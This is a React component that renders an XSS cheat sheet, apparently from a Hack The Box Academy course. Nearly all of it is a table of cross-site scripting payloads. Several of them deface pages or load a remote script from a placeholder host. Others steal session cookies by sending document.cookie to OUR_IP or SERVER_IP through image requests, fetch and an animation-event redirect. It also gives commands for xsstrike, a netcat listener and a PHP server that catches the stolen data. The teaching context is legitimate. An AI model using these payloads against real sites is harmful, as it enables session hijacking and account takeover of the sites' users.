const HTBXSS = () =>{
    return (
        <section class="modal-body">
        <div class="text-center text-break">
        <h5><i class="fad fa-file-alt"></i>&nbsp; Cheat Sheet</h5>
        <h1>The cheat sheet is a useful command reference for XSS.</h1>
        <h2>Commands</h2>
        <div class="table-responsive"><table class="table table-striped text-left">
        <thead>
        <tr>
        <th>Kod</th>
        <th>Opis</th>
        </tr>
        </thead>
        <tbody>
        <tr>
        <td><strong>XSS Payloads</strong></td>
        <td></td>
        </tr>
        <tr>
        <td><code>&lt;script&gt;alert(window.origin)&lt;/script&gt;</code></td>
        <td>Basic XSS Payload</td>
        </tr>
        <tr>
        <td><code>&lt;plaintext&gt;</code></td>
        <td>Basic XSS Payload</td>
        </tr>
        <tr>
        <td><code>&lt;script&gt;print()&lt;/script&gt;</code></td>
        <td>Basic XSS Payload</td>
        </tr>
        <tr>
        <td><code>&lt;img src="" onerror=alert(window.origin)&gt;</code></td>
        <td>HTML-based XSS Payload</td>
        </tr>
        <tr>
        <td><code>&lt;script&gt;document.body.style.background = "#141d2b"&lt;/script&gt;</code></td>
        <td>Change Background Color</td>
        </tr>
        <tr>
        <td><code>&lt;script&gt;document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"&lt;/script&gt;</code></td>
        <td>Change Background Image</td>
        </tr>
        <tr>
        <td><code>&lt;script&gt;document.title = 'HackTheBox Academy'&lt;/script&gt;</code></td>
        <td>Change Website Title</td>
        </tr>
        <tr>
        <td><code>&lt;script&gt;document.getElementsByTagName('body')[0].innerHTML = 'text'&lt;/script&gt;</code></td>
        <td>Overwrite website's main body</td>
        </tr>
        <tr>
        <td><code>&lt;script&gt;document.getElementById('urlform').remove();&lt;/script&gt;</code></td>
        <td>Remove certain HTML element</td>
        </tr>
        <tr>
        <td><code>&lt;script src="http://OUR_IP/script.js"&gt;&lt;/script&gt;</code></td>
        <td>Load remote script</td>
        </tr>
        <tr>
        <td><code>&lt;script&gt;new Image().src='http://OUR_IP/index.php?c='+document.cookie&lt;/script&gt;</code></td>
        <td>Send Cookie details to us</td>
        </tr>
        <tr>
        <td><strong>Commands</strong></td>
        <td></td>
        </tr>
        <tr>
        <td><code>python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"</code></td>
        <td>Run <code>xsstrike</code> on a url parameter</td>
        </tr>
        <tr>
        <td><code>sudo nc -lvnp 80</code></td>
        <td>Start <code>netcat</code> listener</td>
        </tr>
        <tr>
        <td><code>sudo php -S 0.0.0.0:80 </code></td>
        <td>Start <code>PHP</code> server</td>
        </tr>
        <tr>
        <td><code>{`<h1`} onmouseover='document.write(`{`<`}img src="http://{`<SERVER_IP>`}:8000?cookie=${btoa(document.cookie)}"{`>`}`)'{`>`}test{`</h1>`}</code></td>
        <td>in HMTL</td>
        </tr>
        <tr>
        <td><code>{`<script>`}fetch(`http://{`<SERVER_IP>`}:8000?cookie=${btoa(document.cookie)}`){`</script>`}</code></td>
        <td>in HMTL</td>
        </tr>
        <tr>
        <td>{`<style>`}@keyframes x{`{}`}{`</style><video`} style="animation-name:x" onanimationend="window.location = 'http://{`<SERVER_IP>`}:8000/log.php?c=' + document.cookie;"{`></video>`}</td>
        <td>in HMTL + style</td>
        </tr>
        </tbody>
        </table></div>
        </div>
        </section>   
    )
} 

export default HTBXSS